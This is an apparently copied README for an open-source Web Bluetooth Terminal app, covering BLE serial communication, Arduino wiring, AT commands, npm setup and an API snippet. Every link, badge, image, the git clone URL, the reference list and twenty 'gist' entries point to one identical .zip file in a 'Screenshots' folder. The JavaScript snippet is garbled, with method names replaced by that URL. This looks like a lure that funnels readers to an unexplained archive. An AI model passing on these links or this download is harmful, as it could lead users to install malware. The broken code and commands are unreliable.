# Web Bluetooth Terminal

[![NpmVersion](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)
[![dependencies Status](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)
[![devDependencies Status](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)

![Favicon](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)
[https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip) — try
it out, see how it works on [YouTube](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip), read tutorial on
[Medium](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)
(English) or on [Habr](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip) (Russian).

Web Bluetooth Terminal is a website that can **connect** with the remote devices which support **Bluetooth Low Energy**
(also called Bluetooth Smart) and **exchange data bidirectionally**. It can be installed on your homescreen as an
application and work offline.

**Killer feature:** the application establishes **serial communication** over BLE that is not provided by the
specification, but needed if you want to make your own BLE IoT devices using affordable bluetooth modules.

![Teaser](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)

The application utilises BLE service (`0xFFE0`) and characteristic (`0xFFE1`) available in low cost BLE modules based
for example on CC2541 chip, such as HM-10, JDY-08, AT-09, CC41-A and other. Also, it bypasses 20 bytes limit specific
for GATT characteristics by keeping incoming messages in a buffer and waiting for the end of line characters.

Check [Bluetooth Low Energy (Smart) device](#bluetooth-low-energy-smart-device) and
[How to use this app as a base for my own project?](#how-to-use-this-app-as-a-base-for-my-own-project)
sections for a quick start and to find out how to make your own project. Also, I've made
[MeArm Controller](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip) as a showcase project.

## Features

**Accessible via browser** — just go to the [website](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip) and
you'll get the full featured application, it is not needed to install anything.

**Cross-platform** — as long as the app is accessible via browser, you can use it with the desktop or with the smart
phone [browser](#browser).

**Installable** — if you don't want to remember the website address, you can add it to the homescreen.

**Works offline** after installation on your homescreen, since it is a Progressive Web Application.

And... it have **auto scrolling!** Enabled by default, but you can scroll the terminal to the top on more than a half of
the terminal window height to disable it. Scroll to the bottom to enable it again. Rocket science!

## Requirements

### Browser

One of browsers which supports Web Bluetooth API by default
([Chrome Platform Status](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip),
[Can I use](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)):

1. Chrome for desktop 56+
2. Chrome for Android 56+
3. Opera 43+
4. Opera for Android 43+

All this browsers support other necessary features, such as [ES6 classes](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip) and PWA
capabilities ([Web App Manifest](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip) and
[Service Workers](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)), so I don't pay attention to it here.

### Bluetooth Low Energy (Smart) device

Different BLE devices implement their own services and characteristics to communicate with, but you can build your own
simple device: you just need a BLE module (e.g. HM-10, JDY-08, AT-09, CC41-A) and an Arduino Uno. Wire it and upload the
[bridge sketch](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip).

Pay attention to what voltage level your BLE module consumes, since it can vary from device to device! Read
specifications, you may need to connect your BLE module to the `3.3V` pin and use voltage level shifter between `TX` and
`RX` pins.

![Arduino Uno to BLE module wiring scheme](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)

Open Serial Monitor in Arduino IDE, switch baudrate to `9600` and line endings to `Both NL & CR`. Next, launch the
[Web Bluetooth Terminal](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip) and connect to your module. Now you're
able to make a small talk between the Terminal and the Serial Monitor!

#### BLE module configuration

When a BLE module is waiting for connection it can be configured with `AT` commands. So if you have troubles trying to
make BLE module work as expected you can use following commands, but again, read specifications! Here are some commands
I use with CC41-A module:

* `AT+DEFAULT` — resets the module to the defaults;
* `AT+RESET` — resets the module softly;
* `AT+ROLE` — gets the module working mode;
* `AT+ROLE0` — makes the module to work in slave mode, waiting for connection from other devices;
* `AT+NAME` — gets the module name;
* `AT+NAMESimon` — sets the module name to `Simon`;
* `AT+PIN` — gets the module pin (password);
* `AT+PIN123456` — sets the module pin to `123456`;
* `AT+UUID` — gets the module service UUID;
* `AT+CHAR` — gets the module characteristic UUID.

Commands can be case insensitive and may need to be terminated with `CR` (`\r`) and `LF` (`\n`).

## How to use this app as a base for my own project?

You can fork this repository and implement features specific to your needs. Don't forget that application should be
accessible via HTTPS protocol to enable Web Bluetooth API feature, so you can use
[GitHub Pages](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip) switching the source to the `master` branch of your repository.

To use development capabilities, you'll need [https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip), [npm](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip) especially.
Install it, clone the repository and install `npm` dependencies:

```sh
git clone https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
cd Web-Bluetooth-Terminal
npm install
```

### Global install

Alternatively, you can delegate repository cloning to the package itself. Just install it globally:

```sh
npm install -g web-bluetooth-terminal
```

Having this package installed globally, you can use the following command to clone the repository into your current
directory:

```sh
web-bluetooth-terminal
```

Or you can specify directory name to clone into as an argument:

```sh
web-bluetooth-terminal MyProject
```

This command checks out the same version as you have installed globally. So if a new version is released, you can update
package with the following command:

```sh
npm update -g web-bluetooth-terminal
```

### Npm scripts

After installing `npm` dependencies, you can use some simple scripts that can be helpful:

* `npm run build` copies used vendors files and generates `https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip`;
* `npm run js:vendor` copies used vendors JavaScript files into the `js` directory;
* `npm run lint` lints JavaScript files;
* `npm run styles` generates `https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip` from SCSS sources placed in the `scss` directory;
* `npm run styles:vendor` copies used vendors stylesheets into the `css` directory;
* `npm run watch:styles` watches for changes made to the files placed in the `scss` directory and runs `npm run styles`
command.

### https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip API

Also, you can install [bluetooth-terminal](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip) package or
[directly download the file](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)
containing `BluetoothTerminal` class written in ES6 and use it as you want. Here is a simple code snippet that can be
helpful for a quick start:

```js
// Obtain configured instance.
let terminal = new BluetoothTerminal();

// Override `receive` method to handle incoming data as you want.
https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip = function(data) {
  alert(data);
};

// Request the device for connection and get its name after successful connection.
https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip().then(() => {
  alert(https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip() + ' is connected!');
});

// Send something to the connected device.
https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip('Simon says: Hello, world!');

// Disconnect from the connected device.
https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip();
```

## Contribution

Please use the [dev](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip) branch and feel free to contribute!

## Reference

1. [Web Bluetooth Specification](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)
2. [Web Bluetooth Samples](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)
3. [Interact with Bluetooth devices on the Web](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)
4. [Progressive Web Apps](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)
5. [Service Worker Toolbox](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)

## Gists

1. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
2. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
3. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
4. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
5. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
6. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
7. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
8. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
9. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
10. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
11. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
12. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
13. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
14. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
15. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
16. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
17. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
18. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
19. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
20. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
